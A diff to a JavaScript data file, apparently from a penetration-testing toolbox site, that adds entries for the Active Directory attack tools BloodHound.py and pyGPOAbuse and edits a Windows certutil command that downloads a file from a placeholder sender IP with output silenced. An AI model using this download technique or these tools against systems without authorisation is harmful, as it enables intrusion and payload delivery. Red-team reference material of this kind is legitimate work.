@@ -566,6 +566,13 @@ const TOOLBOX_ITEMS = [
         installation: ['wget https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe']
     },
     {
+        name: 'BloodHound.py',
+        category: 'Active Directory',
+        link: 'https://github.com/dirkjanm/BloodHound.py',
+        linkLabel: 'GitHub',
+        installation: ['pip3 install bloodhound-python']
+    },
+    {
         name: 'Impacket',
         category: 'Active Directory',
         link: 'https://github.com/fortra/impacket',
@@ -1558,6 +1565,13 @@ const TOOLBOX_ITEMS = [
         link: 'https://github.com/FSecureLABS/SharpGPOAbuse',
         linkLabel: 'GitHub',
         installation: ['git clone https://github.com/FSecureLABS/SharpGPOAbuse.git']
+    },
+    {
+        name: 'pyGPOAbuse',
+        category: 'Active Directory',
+        link: 'https://github.com/Hackndo/pyGPOAbuse',
+        linkLabel: 'GitHub',
+        installation: ['python3 -m pip install git+https://github.com/Hackndo/pyGPOAbuse']
     },
     {
         name: 'Whisker',
@@ -3530,7 +3544,7 @@ const TRANSFER_PROTOCOLS = [{
                 },
                 {
                     label: 'CMD',
-                    command: 'certutil -urlcache -f http://<SENDER_IP>:<SENDER_PORT>/<FILENAME> <FILENAME>'
+                    command: 'certutil -urlcache -f http://<SENDER_IP>:<SENDER_PORT>/<FILENAME> <FILENAME> >nul'
                 }
             ]
         }
